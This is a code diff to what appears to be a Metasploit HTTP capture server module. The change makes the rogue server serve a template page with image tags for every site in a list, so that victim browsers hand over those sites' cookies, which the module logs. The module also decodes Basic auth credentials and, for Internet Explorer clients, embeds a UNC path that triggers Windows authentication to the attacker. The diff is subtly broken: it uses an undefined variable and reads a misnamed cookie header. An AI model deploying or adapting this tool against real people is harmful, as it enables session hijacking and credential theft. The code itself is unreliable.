@@ -44,7 +44,14 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		register_options(
 			[
 				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
-				OptPath.new('BGIMAGE',    [ false, "The background image to use for the default web page", nil ])
+				OptPath.new('TEMPLATE',   [ false, "The HTML template to serve in responses", 
+						File.join(Msf::Config.install_root, "data", "exploits", "capture", "http", "index.html")
+					]
+				),
+				OptPath.new('SITELIST',   [ false, "The list of URLs that should be used for cookie capture", 
+						File.join(Msf::Config.install_root, "data", "exploits", "capture", "http", "sites.txt")
+					]
+				)
 			], self.class)
 	end
 
@@ -54,9 +61,10 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 	end
 
 	def run
-		@bgimage = datastore['BGIMAGE']
-		@myhost  = datastore['SRVHOST']
-		@myport  = datastore['SRVPORT']
+		@template = datastore['TEMPLATE']
+		@sitelist = datastore['SITELIST']
+		@myhost   = datastore['SRVHOST']
+		@myport   = datastore['SRVPORT']
 		exploit()
 	end
 	
@@ -141,6 +149,10 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		mysrc = Rex::Socket.source_address(cli.peerhost)
 		hhead = (req['Host'] || @myhost).split(':', 2)[0]
 
+
+		cookies = req['Cookies'] || ''
+		
+
 		if(req['Authorization'] and req['Authorization'] =~ /basic/i)
 			basic,auth = req['Authorization'].split(/\s+/)
 			user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
@@ -184,7 +196,7 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 			return
 		end
 		
-		print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers}")
+		print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers} cookies=#{cookies}")
 		
 		
 		# The google maps / stocks view on the iPhone
@@ -204,56 +216,50 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 			print_status("HTTP #{cli.peerhost} is using iTunes Store on the iPhone")
 			# GET /bag.xml
 		end
-		
-		
-		# Background image
-		body_extra = ""
-		if(@bgimage)
-			img_ext = @bgimage.split(".")[-1].downcase
-			req_ext = req.resource.split(".")[-1]
-			ctypes  =
-			{
-				"jpg"   => "image/jpeg",
-				"jpeg"  => "image/jpeg",
-				"png"   => "image/png",
-				"gif"   => "image/gif",
-			}
-			
-			begin
-				if (img_ext == req_ext.downcase)
 
-					ctype = ctypes[img_ext] || ctypes["jpg"]
-					idata = ""
-					isize = File.size(@bgimage)
-					
-					fd = File.open(@bgimage)
-					idata = fd.sysread(isize)
-					fd.close
 
-					res = 
-						"HTTP/1.1 200 OK\r\n" +
-						"Host: #{mysrc}\r\n" +
-						"Content-Type: #{ctype}\r\n" +
-						"Content-Length: #{idata.length}\r\n" +
-						"Connection: Close\r\n\r\n#{idata}"			
-
-					cli.put(res)
-					return
-				end
-			rescue ::Exception
-			end
+		# Handle image requests
+		ctypes  =
+		{
+    		   "jpg"   => "image/jpeg",
+    		   "jpeg"  => "image/jpeg",
+    		   "png"   => "image/png",
+    		   "gif"   => "image/gif",
+		}
 		
-			body_extra = "<img src='/background.#{img_ext}' width='100%' height='100%'>"
+		req_ext = req.resource.split(".")[-1].downcase
+		
+		if(ctypes[req_ext])
+			ctype = ctypes[img_ext] || ctypes["jpg"]
+			res =
+    			   "HTTP/1.1 200 OK\r\n" +
+    			   "Host: #{mysrc}\r\n" +
+    			   "Content-Type: #{ctype}\r\n" +
+    			   "Content-Length: 0\r\n" +
+    			   "Connection: Close\r\n\r\n"
+
+			cli.put(res)
+			return
 		end
+
 		
+		buff = ''
 		
-		data = "<html><head><title>Connecting...</title></head><body>#{body_extra}"
 		if(ua_name == "IE")
-			data << "<img src='\\\\#{mysrc}\\public#{Time.now.to_i.to_s}\\loading.jpg' width='1' height='1'>"
+			buff << "<img src='\\\\#{mysrc}\\public#{Time.now.to_i.to_s}\\loading.jpg' width='1' height='1'>"
 		end
-		
-		data << "</body></html>"
-		
+
+		list = File.readlines(@sitelist)
+		list.each do |site|
+			next if site =~ /^#/
+			site.strip!
+			next if site.length == 0
+			buff << "<img src='http://#{site}/pixel.gif'>"
+		end
+
+		data = File.read(@template)
+		data.gsub!(/%CONTENT%/, buff)
+				
 		res  = 
 			"HTTP/1.1 200 OK\r\n" +
 			"Host: #{mysrc}\r\n" +
